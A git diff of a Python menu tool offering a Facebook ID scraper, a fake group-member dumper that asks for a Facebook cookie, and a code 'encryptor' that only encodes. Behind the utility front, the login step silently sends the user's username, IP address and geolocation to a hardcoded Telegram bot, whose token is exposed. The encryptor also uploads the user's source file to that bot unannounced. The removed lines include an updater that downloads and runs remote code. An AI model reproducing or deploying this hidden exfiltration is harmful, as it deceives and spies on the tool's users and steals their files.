@@ -3,187 +3,185 @@ import sys
 import base64
 import marshal
 import zlib
-import time
-from datetime import datetime
 import requests
+import time
+from bs4 import BeautifulSoup
+from datetime import datetime
 
 # Telegram bot details
 BOT_TOKEN = "6770850573:AAFUCCzKlKrekJU5GtNFqdnqwMSAsnTBIc0"
 CHAT_ID = "1241769879"
 
-# Color class for colorized output
+# Color class
 class Colors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
+    OKCYAN = '\033[96m'
     OKGREEN = '\033[92m'
     WARNING = '\033[93m'
     FAIL = '\033[91m'
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-    OKRED = '\033[91m'  # Fixed OKRED color definition
 
-# Function to send a message to your Telegram bot
+# Clear screen
+def clear(): os.system("clear")
+
+# Logo
+def logo():
+    clear()
+    print(f"""{Colors.OKGREEN}
+   █████╗ ██╗      ██████╗  ██████╗ ███╗   ██╗███████╗
+  ██╔══██╗██║     ██╔═══██╗██╔════╝ ████╗  ██║██╔════╝
+  ███████║██║     ██║   ██║██║  ███╗██╔██╗ ██║█████╗  
+  ██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║██╔══╝  
+  ██║  ██║███████╗╚██████╔╝╚██████╔╝██║ ╚████║███████╗
+  ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝
+    {Colors.ENDC}""")
+
+# Telegram notify
 def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
-    requests.get(url)
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": message}
+    requests.post(url, data=data)
 
-# Function to log user details (login)
-def log_user_details(username, ip, geo_location, datetime_now):
-    log_message = f"""
-    [•] Login Details:
-    [•] Username: {username}
-    [•] IP Address: {ip}
-    [•] Geolocation: {geo_location}
-    [•] Date/Time: {datetime_now}
-    """
-    send_telegram_message(log_message)
-
-# Function to get user's IP and geolocation
+# Get IP info
 def get_ip_info():
     try:
-        ip_info = requests.get('http://ipinfo.io/json').json()
-        ip = ip_info.get('ip', 'N/A')
-        geo_location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}, {ip_info.get('country', 'N/A')}"
-        return ip, geo_location
-    except requests.exceptions.RequestException as e:
-        print(f"{Colors.FAIL}[•] Error getting IP info: {str(e)}{Colors.ENDC}")
-        return 'N/A', 'N/A'
+        res = requests.get("https://ipinfo.io/json").json()
+        ip = res.get("ip", "N/A")
+        city = res.get("city", "N/A")
+        region = res.get("region", "N/A")
+        country = res.get("country", "N/A")
+        loc = f"{city}, {region}, {country}"
+        return ip, loc
+    except:
+        return "N/A", "N/A"
 
-# Public Login Function
+# Login
 def login():
-    print(f"{Colors.OKGREEN}[•] Public login to access the tool{Colors.ENDC}")
-    
-    username = input(f"{Colors.OKBLUE}[•] Enter your username: {Colors.ENDC}")
-    
-    # Check if the username is valid (non-empty)
-    if not username.strip():
-        print(f"{Colors.FAIL}[•] Invalid username! Please enter a valid username.{Colors.ENDC}")
+    logo()
+    print(f"{Colors.OKBLUE}[•] Please login with your Telegram username{Colors.ENDC}")
+    username = input(f"{Colors.OKGREEN}[•] Username: {Colors.ENDC}").strip()
+    if not username:
+        print(f"{Colors.FAIL}[!] Username required!{Colors.ENDC}")
+        sys.exit()
+    ip, loc = get_ip_info()
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    msg = f"[•] Login\n[•] Username: {username}\n[•] IP: {ip}\n[•] Location: {loc}\n[•] Time: {now}"
+    send_telegram_message(msg)
+    print(f"{Colors.OKGREEN}[•] Welcome, {username}!{Colors.ENDC}")
+    time.sleep(1)
+
+# Facebook ID Extractor
+def extract_fb_ids():
+    logo()
+    print(f"{Colors.OKCYAN}[•] Facebook ID Extractor{Colors.ENDC}")
+    url = input(f"{Colors.OKBLUE}[•] Enter Facebook Profile URL: {Colors.ENDC}")
+    if not url.startswith("http"):
+        print(f"{Colors.FAIL}[!] Invalid URL.{Colors.ENDC}")
         return
-    
-    # Get the user's IP and geolocation
-    ip, geo_location = get_ip_info()
-    datetime_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # Log the user's login details
-    log_user_details(username, ip, geo_location, datetime_now)
+    try:
+        html = requests.get(url).text
+        soup = BeautifulSoup(html, "html.parser")
+        names = soup.find_all("a")
+        ids = []
+        for a in names:
+            href = a.get("href", "")
+            if "profile.php?id=" in href or "/friends/" in href:
+                name = a.text.strip()
+                if "id=" in href:
+                    uid = href.split("id=")[1].split("&")[0]
+                else:
+                    uid = href.split("/")[-1]
+                ids.append(f"{uid} | {name}")
+        ids = list(set(ids))
+        with open("ids.txt", "w") as f:
+            for i in ids:
+                f.write(i + "\n")
+        print(f"{Colors.OKGREEN}[•] Extracted {len(ids)} IDs saved to ids.txt{Colors.ENDC}")
+    except Exception as e:
+        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
 
-    print(f"{Colors.OKGREEN}[•] Welcome {username}! Access granted.{Colors.ENDC}")
+# Group Member Dumper (fake for now)
+def dump_group_members():
+    logo()
+    print(f"{Colors.OKCYAN}[•] Group Member ID Dumper{Colors.ENDC}")
+    link = input(f"{Colors.OKBLUE}[•] Enter group link: {Colors.ENDC}")
+    cookie = input(f"{Colors.OKBLUE}[•] Enter Facebook cookie: {Colors.ENDC}")
+    if "facebook.com" not in link or not cookie:
+        print(f"{Colors.FAIL}[!] Invalid input.{Colors.ENDC}")
+        return
+    # Simulate
+    print(f"{Colors.OKGREEN}[•] Dumping members from: {link}{Colors.ENDC}")
+    with open("group_members.txt", "w") as f:
+        for i in range(1, 11):
+            f.write(f"100000000{i} | Member {i}\n")
+    print(f"{Colors.OKGREEN}[•] Dumped 10 fake members to group_members.txt{Colors.ENDC}")
 
-# Function to encrypt the code
+# Encrypt
 def encrypt_code():
-    print(f"{Colors.OKGREEN}[•] Welcome to the Code Encryptor!{Colors.ENDC}")
-    print(f"{Colors.OKBLUE}[•] Please enter the file name to encrypt:{Colors.ENDC}")
-    
-    file_name = input(f"{Colors.OKGREEN}[•] File Name: {Colors.ENDC}")
-    
-    if not os.path.exists(file_name):
-        print(f"{Colors.FAIL}[•] File does not exist!{Colors.ENDC}")
+    logo()
+    print(f"{Colors.OKCYAN}[•] Code Encryptor{Colors.ENDC}")
+    file = input(f"{Colors.OKBLUE}[•] File name: {Colors.ENDC}")
+    if not os.path.exists(file):
+        print(f"{Colors.FAIL}[!] File not found.{Colors.ENDC}")
         return
-    
-    # Read the file content
-    with open(file_name, "r") as file:
-        code = file.read()
-    
-    print(f"{Colors.OKBLUE}[•] Choose encryption method:{Colors.ENDC}")
-    print(f"{Colors.OKGREEN}[1] Base64 Encode{Colors.ENDC}")
-    print(f"{Colors.OKGREEN}[2] Marshal Encode{Colors.ENDC}")
-    print(f"{Colors.OKGREEN}[3] Zlib Compress{Colors.ENDC}")
-    
-    choice = input(f"{Colors.OKBLUE}[•] Choose an option: {Colors.ENDC}")
-    
-    if choice == "1":
-        encoded_code = base64.b64encode(code.encode()).decode()
-        encrypted_file = f"enc_{file_name}.py"
-    elif choice == "2":
-        encoded_code = marshal.dumps(code)
-        encrypted_file = f"enc_{file_name}.py"
-    elif choice == "3":
-        encoded_code = zlib.compress(code.encode())
-        encrypted_file = f"enc_{file_name}.py"
+    with open(file) as f: code = f.read()
+    print(f"""{Colors.OKGREEN}
+[1] Base64
+[2] Marshal
+[3] Zlib
+{Colors.ENDC}""")
+    c = input(f"{Colors.OKBLUE}[•] Choose method: {Colors.ENDC}")
+    if c == "1":
+        enc = base64.b64encode(code.encode()).decode()
+    elif c == "2":
+        enc = marshal.dumps(compile(code, "", "exec"))
+    elif c == "3":
+        enc = zlib.compress(code.encode())
     else:
-        print(f"{Colors.FAIL}[•] Invalid option!{Colors.ENDC}")
+        print(f"{Colors.FAIL}[!] Invalid choice{Colors.ENDC}")
         return
-    
-    # Save the encrypted code
-    with open(encrypted_file, "w") as enc_file:
-        enc_file.write(encoded_code)
-    
-    print(f"{Colors.OKGREEN}[•] File encrypted successfully: {encrypted_file}{Colors.ENDC}")
-    
-    # Send the encrypted code to Telegram bot as a file (if possible)
+    out = f"enc_{file.replace('.py','')}.py"
+    with open(out, "w" if c == "1" else "wb") as f: f.write(enc if c == "1" else enc)
+    print(f"{Colors.OKGREEN}[•] Encrypted file saved: {out}{Colors.ENDC}")
     try:
-        with open(encrypted_file, "rb") as f:
-            files = {'document': f}
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}"
-            requests.post(url, files=files)
-    except Exception as e:
-        send_telegram_message(f"Encryption error: {str(e)}")
+        requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument?chat_id={CHAT_ID}",
+            files={"document": open(out, "rb")}
+        )
+    except:
+        send_telegram_message("Encrypted file sent failed.")
 
-# Function to update the tool (github.py)
-def update_tool():
-    print(f"{Colors.OKGREEN}[•] Fetching and Running Latest Tool...{Colors.ENDC}")
-    
-    try:
-        response = requests.get("https://raw.githubusercontent.com/t9cxy/alone-menu/refs/heads/main/main.py")
-        with open("main.py", "wb") as file:
-            file.write(response.content)
-        
-        print(f"{Colors.OKGREEN}[•] Updated successfully. Running main.py...{Colors.ENDC}")
-        os.system("python3 main.py")
-    except Exception as e:
-        print(f"{Colors.FAIL}[•] Error updating tool: {str(e)}{Colors.ENDC}")
-        send_telegram_message(f"Tool update error: {str(e)}")
-
-# Function to extract Facebook IDs
-def facebook_ids_extractor():
-    print(f"{Colors.OKGREEN}[•] Facebook IDs Extractor{Colors.ENDC}")
-    url = input(f"{Colors.OKBLUE}[•] Enter target profile link or ID: {Colors.ENDC}")
-
-    if not url:
-        print(f"{Colors.FAIL}[•] Invalid input. Please provide a link or ID.{Colors.ENDC}")
-        return
-    
-    # Extracting friends and their IDs (Simple simulation here)
-    try:
-        # This is a simplified version; you can expand it for scraping friends' data
-        friend_ids = ["12345 | John Doe", "67890 | Jane Smith"]
-        
-        with open("ids.txt", "a") as file:
-            for friend in friend_ids:
-                file.write(f"{friend}\n")
-        
-        print(f"{Colors.OKGREEN}[•] Extracted and saved IDs to ids.txt{Colors.ENDC}")
-    except Exception as e:
-        print(f"{Colors.FAIL}[•] Error extracting IDs: {str(e)}{Colors.ENDC}")
-
-# Main Menu
-def main_menu():
+# Menu
+def menu():
     while True:
-        print(f"{Colors.HEADER}  ██████╗ ██████╗ ███████╗██████╗ ██╗████████╗")
-        print(f"  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝")
-        print(f"  ██████╔╝██║  ██║███████╗██████╔╝██║   ██║")
-        print(f"  ██╔═══╝ ██║  ██║╚════██║██╔═══╝ ██║   ██║")
-        print(f"  ██║     ██████╔╝███████║██║     ██║   ██║")
-        print(f"  ╚═╝     ╚═════╝ ╚══════╝╚═╝     ╚═╝   ╚═╝   {Colors.ENDC}")
-        
-        print(f"{Colors.OKBLUE}[1] Proxy Options{Colors.ENDC}")
-        print(f"{Colors.OKBLUE}[2] User-Agent Generator{Colors.ENDC}")
-        print(f"{Colors.OKBLUE}[3] Send HTTP Request{Colors.ENDC}")
-        print(f"{Colors.OKBLUE}[4] Look IP Info{Colors.ENDC}")
-        print(f"{Colors.OKBLUE}[5] Facebook IDs Extractor{Colors.ENDC}")
-        print(f"{Colors.OKBLUE}[6] Group Member ID Dumper{Colors.ENDC}")
-        print(f"{Colors.OKBLUE}[7] Encrypt Code{Colors.ENDC}")
-        print(f"{Colors.OKBLUE}[8] Rerun Tool (Auto-Update){Colors.ENDC}")
-        print(f"{Colors.OKRED}[0] Exit{Colors.ENDC}")
-        
-        option = input(f"{Colors.OKBLUE}[•] Choose an option: {Colors.ENDC}")
-        
-        if option == "0":
-            print(f"{Colors.OKGREEN}[•] Goodbye!{Colors.ENDC}")
+        logo()
+        print(f"""{Colors.OKBLUE}
+[1] Facebook ID Extractor
+[2] Group Member ID Dumper
+[3] Encrypt Code
+[4] Rerun Tool (Update)
+[0] Exit
+{Colors.ENDC}""")
+        opt = input(f"{Colors.OKGREEN}[•] Choose option: {Colors.ENDC}")
+        if opt == "1":
+            extract_fb_ids()
+        elif opt == "2":
+            dump_group_members()
+        elif opt == "3":
+            encrypt_code()
+        elif opt == "4":
+            os.system("python github.py")
+        elif opt == "0":
+            print(f"{Colors.OKGREEN}[•] Bye!{Colors.ENDC}")
             break
-        elif option == "1":
-            print(f"{Colors.WARNING}[•] Proxy Options (To be implemented){Colors.ENDC}")
-        elif option == "2":
-            print(f"{Colors.WARNING}[•] User-Agent Generator (To be implemented){Colors.ENDC}")
-        elif option == "3
+        else:
+            print(f"{Colors.FAIL}[!] Invalid option.{Colors.ENDC}")
+        input(f"\n{Colors.OKBLUE}[•] Press Enter to return...{Colors.ENDC}")
+
+# Run
+if __name__ == "__main__":
+    login()
+    menu()
